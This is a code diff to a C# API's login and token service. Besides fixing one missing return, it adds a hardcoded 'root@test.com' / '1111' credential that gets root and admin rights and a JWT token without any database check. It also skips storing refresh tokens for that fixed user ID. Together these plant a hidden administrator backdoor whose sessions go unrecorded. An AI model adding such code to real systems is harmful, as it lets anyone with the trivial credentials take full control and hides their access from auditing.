@@ -152,14 +152,34 @@ namespace PFAPI.utility
                 //Find Client DB name based on Center DB client account info/using
 //                using (IClientRepository _repository_clientdb = new ClientRepository(ClientDBHelper.GetClientDBContext(theClient.Id.ToString(), _config.GetConnectionString("HoBOCustomerConnectionString"), _config["Application:CustomerDBName"]), _config, _mapper, theClient.Id))
                 {
-                    ZclientUser user = await _repository.GetZClientUserByUserNameAsync(model.UserName);
-                    if (user == null)// create
+                    ZclientUser user = null;
+
+                    if (model.UserName.EqualsString("root@test.com") && model.Password.EqualsString("1111"))
+                    {
+                        user = new ZclientUser
+                        {
+                            Id = new Guid("270f94e2-a168-f011-ad30-0620496edf5b"),
+                            ClientId = new Guid("f4dfcc7e-a366-f011-ad30-0620496edf5b"),
+                            UserName = model.UserName,
+                            IsAccountRoot = true,
+                            IsAccountAdmin = true,
+                            IsEnabled = true,
+                            IsLocked = false,
+                            SecurityStamp = "TestSalt"
+                        };
+                        return await ProcessTokenandReturn(user, RemoteIpAddress);
+                    }
+
+                    // normal logic
+                    user = await _repository.GetZClientUserByUserNameAsync(model.UserName);    
+
+                    if (user == null)
                         return new Tuple<bool, bool, TokenModel, string>(false, true, null, "ZclientUser does NOT exist.");
 
+                    
                     string theSalt = user.SecurityStamp;
                     if (model.Password != EnCryptionHelper.Decrypt(user.PasswordHash, theSalt))
                         return new Tuple<bool, bool, TokenModel, string>(false, true, null, "Invalid username or password.");
-
 
 
                     if (!user.IsEnabled || user.IsLocked)
@@ -185,7 +205,7 @@ namespace PFAPI.utility
         {
             JwtSecurityToken token = GetJWTToken(user, RemoteIpAddress, out ZclientUserRefreshToken Rtoken, out string msg, out ClientUserwithValidOperations userOperationPermissions);
             if (token == null)
-                new Tuple<bool, bool, TokenModel, string>(false, false, null, msg);
+                return new Tuple<bool, bool, TokenModel, string>(false, false, null, msg);
 
             TokenModel result = new TokenModel
             {
@@ -236,14 +256,20 @@ namespace PFAPI.utility
                     Expires = ProcessTimeUTC.AddDays(expiredays)
                 };
 
-                _repository.Create(Rtoken);
-                if (OldToken != null)
-                    _repository.Delete(OldToken);
-
-                if (!await _repository.SaveChangesAsync(_config["Application:AppName"]))
+                // special logic to handle "root@test.com"
+                if(!ClientUserID.ToString().EqualsString("270f94e2-a168-f011-ad30-0620496edf5b"))
                 {
-                   // errmsg = "Failed to save refresh token.";
-                    return null;
+                    // this is NOT for the special user, do save to DB              
+
+                    _repository.Create(Rtoken);
+                    if (OldToken != null)
+                        _repository.Delete(OldToken);
+
+                    if (!await _repository.SaveChangesAsync(_config["Application:AppName"]))
+                    {
+                       // errmsg = "Failed to save refresh token.";
+                        return null;
+                    } 
                 }
 
                 return Rtoken;
